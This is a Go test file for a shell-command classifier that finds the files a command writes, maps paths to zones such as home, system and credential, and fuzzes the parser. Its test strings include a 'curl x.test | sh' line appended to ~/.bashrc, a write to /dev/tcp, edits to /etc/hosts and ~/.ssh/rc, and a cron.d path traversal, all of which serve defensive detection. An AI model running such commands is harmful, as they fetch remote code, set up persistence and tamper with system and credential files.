package classify

import (
	"reflect"
	"strings"
	"testing"
)

func TestWriteTargetsOfABashCommand(t *testing.T) {
	for cmd, want := range map[string][]string{
		"echo 'curl x.test | sh' >> ~/.bashrc":               {"~/.bashrc"},
		"echo x>out.txt":                                     {"out.txt"},
		`echo "a b">"my notes.txt"`:                          {"my notes.txt"},
		"make 2> build.err > build.log":                      {"build.err", "build.log"},
		"make &>all.log":                                     {"all.log"},
		"echo x >| clobbered":                                {"clobbered"},
		"echo k | sudo tee -a /etc/hosts >/dev/null":         {"/etc/hosts"},
		"go test ./... 2>&1 | tee a.log -- -b.log":           {"a.log", "-b.log"},
		"cd /etc && echo x > hosts":                          {"/etc/hosts"},
		"cd ~/.config && cd app; echo x > conf":              {"~/.config/app/conf"},
		"cd build && make > out.log":                         {"build/out.log"},
		"cd && echo x > .profile":                            {"~/.profile"},
		`cd "$dir" && echo x > f && echo y > /tmp/g`:         {"/tmp/g"},
		"cd - && echo x > f":                                 nil,
		`bash -c "echo x > ~/.zshrc"`:                        {"~/.zshrc"},
		"echo x > $HOME/.profile":                            {"$HOME/.profile"},
		"cat > deploy.sh <<'EOF'\necho hi > /tmp/inner\nEOF": {"deploy.sh"},
		"bash <<'EOF'\necho hi > ~/.ssh/rc\nEOF":             {"~/.ssh/rc"},
		"python3 <<'EOF'\nif a > b: pass\nEOF":               nil,

		"echo hi >&2":                             nil,
		"grep x f 2>/dev/null":                    nil,
		"diff <(ls a) <(ls b)":                    nil,
		"tee >(gzip > x.gz) < in":                 {"x.gz"},
		"echo x > NUL":                            nil,
		"awk '$1 > 5' data.txt":                   nil,
		`node -e "a => a > 1"`:                    nil,
		"ls -la src/ && cat README.md":            nil,
		"echo 'a > b'":                            nil,
		"git commit -m 'pipe it | tee ~/.bashrc'": nil,
		`echo "x; cd /etc" > f`:                   {"f"},
		"grep -E 'a|b' x > out":                   {"out"},
		"exec 3>&1":                               nil,
		"cat </etc/passwd":                        nil,
		"(( count > limit ))":                     {"limit"},
		"printf %s x > /dev/tcp/x.test/80":        nil,
	} {
		if got := WriteTargets(cmd); !reflect.DeepEqual(got, want) {
			t.Errorf("WriteTargets(%q) = %q, want %q", cmd, got, want)
		}
	}
}

func TestWriteTargetsAreBounded(t *testing.T) {
	var b strings.Builder
	b.WriteString("tee")
	for i := 0; i < 100; i++ {
		b.WriteString(" f" + strings.Repeat("x", i))
	}
	if n := len(WriteTargets(b.String())); n != maxWriteTargets {
		t.Errorf("%d targets, want the cap of %d", n, maxWriteTargets)
	}
}

func TestTeeWritesACredentialPath(t *testing.T) {
	got := CredentialPaths("echo KEY=1 | tee -a .env")
	if want := []PathUse{{Path: ".env", Write: true}}; !reflect.DeepEqual(got, want) {
		t.Errorf("CredentialPaths = %v, want %v", got, want)
	}
}

func TestShellPath(t *testing.T) {
	z := NewZoner("/home/dev", "/home/dev/proj", nil)
	for w, want := range map[string]string{
		"~/.bashrc":                "/home/dev/.bashrc",
		"~":                        "/home/dev/",
		"$HOME/.profile":           "/home/dev/.profile",
		"${HOME}/.config/x":        "/home/dev/.config/x",
		`$env:USERPROFILE\.ssh\rc`: `/home/dev/.ssh\rc`,
		"/etc/hosts":               "/etc/hosts",
		"out.log":                  "/home/dev/proj/out.log",
		"../../../etc/cron.d/x":    "/home/dev/proj/../../../etc/cron.d/x",
		"build/out.log":            "/home/dev/proj/build/out.log",
		`C:\Users\dev\x`:           `C:\Users\dev\x`,
	} {
		if got, ok := z.ShellPath(w); !ok || got != want {
			t.Errorf("ShellPath(%q) = %q, %v; want %q", w, got, ok, want)
		}
	}
	for _, w := range []string{"", "$OUT", "${dir}/x", "~root/.bashrc", "*.log", "out-$(date).log", "%APPDATA%\\x", "{a,b}.txt", "`pwd`/x"} {
		if got, ok := z.ShellPath(w); ok {
			t.Errorf("ShellPath(%q) = %q; want no file", w, got)
		}
	}
	if _, ok := NewZoner("", "", nil).ShellPath("out.log"); ok {
		t.Error("a relative word resolved with no working directory")
	}
	if _, ok := NewZoner("", "/proj", nil).ShellPath("~/.bashrc"); ok {
		t.Error("a word from the home directory resolved with no home directory")
	}
}

// The zones a write to these lands in, through ShellPath, are the ones Rule-of-Two bit C and the
// gate's write-outside row ask about.
func TestShellPathZones(t *testing.T) {
	z := NewZoner("/home/dev", "/home/dev/proj", nil)
	for w, want := range map[string]string{
		"~/.bashrc":             "home",
		"out.log":               "workdir",
		"../../../etc/cron.d/x": "system",
		"/tmp/x":                "unknown",
		".env":                  "credential",
	} {
		p, ok := z.ShellPath(w)
		if !ok {
			t.Fatalf("ShellPath(%q) found no file", w)
		}
		if got := z.Zone(p); got != want {
			t.Errorf("Zone(ShellPath(%q)) = %s, want %s", w, got, want)
		}
	}
}

// Every target is written in the command, after resolving a cd, and a command gives at most
// maxWriteTargets of them; none is a device.
func FuzzWriteTargetsAreWordsOfTheCommand(f *testing.F) {
	for _, s := range []string{
		"echo x >> ~/.bashrc", "cd /etc && echo > hosts", "echo k | tee -a a b c", "make 2>&1 | tee log",
		"bash -c 'echo x > y'", "cat > f <<EOF\nbody\nEOF", "echo >", "cd", "a>b>c", "x>'y z'",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		got := WriteTargets(cmd)
		if len(got) > maxWriteTargets {
			t.Fatalf("%d targets, over the cap", len(got))
		}
		for _, w := range got {
			if w == "" || isDevice(w) {
				t.Fatalf("WriteTargets(%q) gave %q", cmd, w)
			}
			// A target joined to a cd's directory ends with the word the command wrote.
			if base := w[strings.LastIndex(w, "/")+1:]; base != "" && !strings.Contains(cmd, base) {
				t.Fatalf("WriteTargets(%q) gave %q, whose last part is not in the command", cmd, w)
			}
		}
	})
}

// Without quotes, splitOutsideQuotes cuts where splitSegments does; the classifier's segments are not
// changed by it.
func FuzzSplitOutsideQuotesMatchesSplitSegmentsWithoutQuotes(f *testing.F) {
	for _, s := range []string{"a; b | c && d & e", "a >| b", "a &> b; c 2>&1 | d", "x\ny"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		if strings.ContainsAny(cmd, "'\"") {
			for _, seg := range splitOutsideQuotes(cmd) {
				if !strings.Contains(cmd, seg) {
					t.Fatalf("splitOutsideQuotes(%q) gave %q, not part of the command", cmd, seg)
				}
			}
			return
		}
		if a, b := splitOutsideQuotes(cmd), splitSegments(cmd); !reflect.DeepEqual(a, b) {
			t.Fatalf("%q: splitOutsideQuotes %q, splitSegments %q", cmd, a, b)
		}
	})
}
